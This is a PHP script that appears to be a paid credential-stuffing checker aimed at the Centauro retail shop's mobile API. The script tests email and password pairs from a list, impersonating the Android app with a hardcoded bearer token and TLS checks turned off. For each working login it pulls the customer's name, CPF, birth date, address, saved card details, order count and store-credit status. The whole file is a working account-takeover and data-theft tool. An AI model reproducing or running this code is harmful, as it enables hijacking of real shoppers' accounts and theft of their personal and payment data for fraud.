<?php

#############################################
error_reporting(0);
set_time_limit(0);

require_once("../count.php");

$valor_live = 0.1;

if($saldo < $valor_live){
echo "<div class='text-center text-danger'><b>Creditos Insuficientes</b></div>";
exit();
}
#############################################



error_reporting(0);
DeletarCookies();
date_default_timezone_set('America/Sao_Paulo');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function puxar($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function deletarCookies() {
  if (file_exists("cielo.txt")) {
    unlink("cielo.txt");
  }
}


extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];
$lista = ("$email|$senha");


//---------------------------// POST //------------------------//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://apigateway.centauro.com.br/ecommerce/v2.1/clientes/login');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: apigateway.centauro.com.br',
'user-agent: Centauro/1.9.36 (samsung j7y17lte; 9 API 28)',
'x-client-useragent: android',
'x-cv-id: 14',
'authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcGlnYXRld2F5LmRjLnNibmV0Iiwic3ViIjoid3d3LmNlbnRhdXJvLmNvbS5iciIsImlhdCI6MTU5MDY1NTkzOSwiY2xpZW50X2lkIjoiMWY2OThhYTgtNzNjOC00ZjQ4LWJiNWMtZjlmMTUxOTdjOTBhIn0.sH43caLh5Sumej4s4A4yonnQrKq-c8ltzVyOarthNQ-N2kZHiJnBt8MG_BXiHQMKoH5kweO74nvY9JyzxNRuo1u_CFjo2qZLzCVlOVuBOz_SmHmEPv6prpxuoHM2L9QY3KOgS0kPLalkyjNtX_I7kF-iWHPl0R_P1HAb7KgzQ8pt_nJUmT1htM7yYSVuGfk4OU6xPzqT-t2VLPrOAVEIirGYmeplA41g-dxB69nU8FbVGbKY47lp2ta9aIVDqe9irENi08hKCCieLhqVa21A6kaCN1tcdlZRsmqeUF-FUl5b45xwbILwpBy4qr9V1mrY5oaScWn2CQnWaIJ6ZDQrzA',
'content-type: application/json; charset=UTF-8'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"limparCarrinho":false,"usuario":"'.$email.'","ManterLogado":true,"senha":"'.$senha.'"}');
$login = curl_exec($ch);

$token = puxar($login, 'token":"', '"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://apigateway.centauro.com.br/ecommerce/v2.2/cartoes');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: apigateway.centauro.com.br',
'user-agent: Centauro/1.9.36 (samsung j7y17lte; 9 API 28)',
'x-client-useragent: android',
'x-cv-id: 14',
'authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcGlnYXRld2F5LmRjLnNibmV0Iiwic3ViIjoid3d3LmNlbnRhdXJvLmNvbS5iciIsImlhdCI6MTU5MDY1NTkzOSwiY2xpZW50X2lkIjoiMWY2OThhYTgtNzNjOC00ZjQ4LWJiNWMtZjlmMTUxOTdjOTBhIn0.sH43caLh5Sumej4s4A4yonnQrKq-c8ltzVyOarthNQ-N2kZHiJnBt8MG_BXiHQMKoH5kweO74nvY9JyzxNRuo1u_CFjo2qZLzCVlOVuBOz_SmHmEPv6prpxuoHM2L9QY3KOgS0kPLalkyjNtX_I7kF-iWHPl0R_P1HAb7KgzQ8pt_nJUmT1htM7yYSVuGfk4OU6xPzqT-t2VLPrOAVEIirGYmeplA41g-dxB69nU8FbVGbKY47lp2ta9aIVDqe9irENi08hKCCieLhqVa21A6kaCN1tcdlZRsmqeUF-FUl5b45xwbILwpBy4qr9V1mrY5oaScWn2CQnWaIJ6ZDQrzA',
'x-client-token: '.$token.'',));
$dadoscartoes = curl_exec($ch);

$bandeira = puxar($dadoscartoes, 'administradora":"', '"');
$cartao = puxar($dadoscartoes, 'numeroMascarado":"************', '"');
$ano = puxar($dadoscartoes, 'anoValidade":', ',"');
$mes = puxar($dadoscartoes, 'mesValidade":', ',"');
$validacaocvv = puxar($dadoscartoes, 'validacaoOneClickBuyNecessaria":', ',"');

#################################################################
if(strpos($dadoscartoes, 'validacaoOneClickBuyNecessaria":true')){
  $validacao = "Sim";
}
else{
  $validacao = "Não";
}
#################################################################

#################################################################
if(strpos($dadoscartoes, 'numeroMascarado')){
  $cartoes = "Cartão: $bandeira | $mes/$ano | Validação de CVV para compras ativadas:<font color='red'> $validacao </font>";
}
else{
  $cartoes = "Cartões:<font color='red'> Sem cartões</font>";
}
#################################################################


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://apigateway.centauro.com.br/ecommerce/v3/clientes');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: apigateway.centauro.com.br',
'user-agent: Centauro/1.9.36 (samsung j7y17lte; 9 API 28)',
'x-client-useragent: android',
'x-cv-id: 14',
'authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcGlnYXRld2F5LmRjLnNibmV0Iiwic3ViIjoid3d3LmNlbnRhdXJvLmNvbS5iciIsImlhdCI6MTU5MDY1NTkzOSwiY2xpZW50X2lkIjoiMWY2OThhYTgtNzNjOC00ZjQ4LWJiNWMtZjlmMTUxOTdjOTBhIn0.sH43caLh5Sumej4s4A4yonnQrKq-c8ltzVyOarthNQ-N2kZHiJnBt8MG_BXiHQMKoH5kweO74nvY9JyzxNRuo1u_CFjo2qZLzCVlOVuBOz_SmHmEPv6prpxuoHM2L9QY3KOgS0kPLalkyjNtX_I7kF-iWHPl0R_P1HAb7KgzQ8pt_nJUmT1htM7yYSVuGfk4OU6xPzqT-t2VLPrOAVEIirGYmeplA41g-dxB69nU8FbVGbKY47lp2ta9aIVDqe9irENi08hKCCieLhqVa21A6kaCN1tcdlZRsmqeUF-FUl5b45xwbILwpBy4qr9V1mrY5oaScWn2CQnWaIJ6ZDQrzA',
'x-client-token: '.$token.'',));
$dados = curl_exec($ch);

##########################################################
$nome = puxar($dados, 'nome":"', '"');
$sobrenome = puxar($dados, 'sobrenome":"', '"');
$datanasc = puxar($dados, 'dataDeNascimento":"', 'T00:00:00"');
$cpf = puxar($dados, 'cpf":"', '"');
$endereço = puxar($dados, 'logradouro":"', '"');
$cep = puxar($dados, 'cep":"', '"');
$estado = puxar($dados, 'estado":"', '"');
$cidade = puxar($dados, 'cidade":"', '"');
$bairro = puxar($dados, 'bairro":"', '"');
if(strpos($dados, 'possuiCompraRapidaHabilitada":false')){
 $oneclick = "<font color='red'>Desativado</font>";
}
else{
 $oneclick = "<font color='red'>Ativado</font>";
}
##########################################################

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://apigateway.centauro.com.br/ecommerce/v2.1/clientes/pedidos?quantidade=10&pular=0');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: apigateway.centauro.com.br',
'user-agent: Centauro/1.9.36 (samsung j7y17lte; 9 API 28)',
'x-client-useragent: android',
'x-cv-id: 14',
'authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcGlnYXRld2F5LmRjLnNibmV0Iiwic3ViIjoid3d3LmNlbnRhdXJvLmNvbS5iciIsImlhdCI6MTU5MDY1NTkzOSwiY2xpZW50X2lkIjoiMWY2OThhYTgtNzNjOC00ZjQ4LWJiNWMtZjlmMTUxOTdjOTBhIn0.sH43caLh5Sumej4s4A4yonnQrKq-c8ltzVyOarthNQ-N2kZHiJnBt8MG_BXiHQMKoH5kweO74nvY9JyzxNRuo1u_CFjo2qZLzCVlOVuBOz_SmHmEPv6prpxuoHM2L9QY3KOgS0kPLalkyjNtX_I7kF-iWHPl0R_P1HAb7KgzQ8pt_nJUmT1htM7yYSVuGfk4OU6xPzqT-t2VLPrOAVEIirGYmeplA41g-dxB69nU8FbVGbKY47lp2ta9aIVDqe9irENi08hKCCieLhqVa21A6kaCN1tcdlZRsmqeUF-FUl5b45xwbILwpBy4qr9V1mrY5oaScWn2CQnWaIJ6ZDQrzA',
'x-client-token: '.$token.'',));
$pedidos = curl_exec($ch);

####################################################################
$totalpedidos = puxar($pedidos, 'quantidadeTotalPedidos":', ',"');
####################################################################

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://apigateway.centauro.com.br/ecommerce/v4.2/clientes/valetrocas');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: apigateway.centauro.com.br',
'user-agent: Centauro/1.9.36 (samsung j7y17lte; 9 API 28)',
'x-client-useragent: android',
'x-cv-id: 14',
'authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcGlnYXRld2F5LmRjLnNibmV0Iiwic3ViIjoid3d3LmNlbnRhdXJvLmNvbS5iciIsImlhdCI6MTU5MDY1NTkzOSwiY2xpZW50X2lkIjoiMWY2OThhYTgtNzNjOC00ZjQ4LWJiNWMtZjlmMTUxOTdjOTBhIn0.sH43caLh5Sumej4s4A4yonnQrKq-c8ltzVyOarthNQ-N2kZHiJnBt8MG_BXiHQMKoH5kweO74nvY9JyzxNRuo1u_CFjo2qZLzCVlOVuBOz_SmHmEPv6prpxuoHM2L9QY3KOgS0kPLalkyjNtX_I7kF-iWHPl0R_P1HAb7KgzQ8pt_nJUmT1htM7yYSVuGfk4OU6xPzqT-t2VLPrOAVEIirGYmeplA41g-dxB69nU8FbVGbKY47lp2ta9aIVDqe9irENi08hKCCieLhqVa21A6kaCN1tcdlZRsmqeUF-FUl5b45xwbILwpBy4qr9V1mrY5oaScWn2CQnWaIJ6ZDQrzA',
'x-client-token: '.$token.'',));
$valestrocas = curl_exec($ch);


###################################################################################
if(strpos($valestrocas, 'Você não possui vale-troca para utilização até o momento!')){
  $vales = "Não";
}
else {
  $vales = "Sim";
}
###################################################################################


if(strpos($login, 'token')){
 echo "Aprovada -> $lista | Nome: $nome $sobrenome | CPF: $cpf | Data de nascimento: $datanasc | CEP: $cep | Endereço: $endereço | Estado: $estado | cidade: $cidade | Bairro: $bairro | Pedidos Total: $totalpedidos |OneClick: $oneclick | $cartoes | @EzCentral <br>";
debitar($valor_live);
}

else{
  echo "Reprovada -> $lista | Retorno:<font color='red'> $login </font> <br>";
}

curl_close($ch);
?>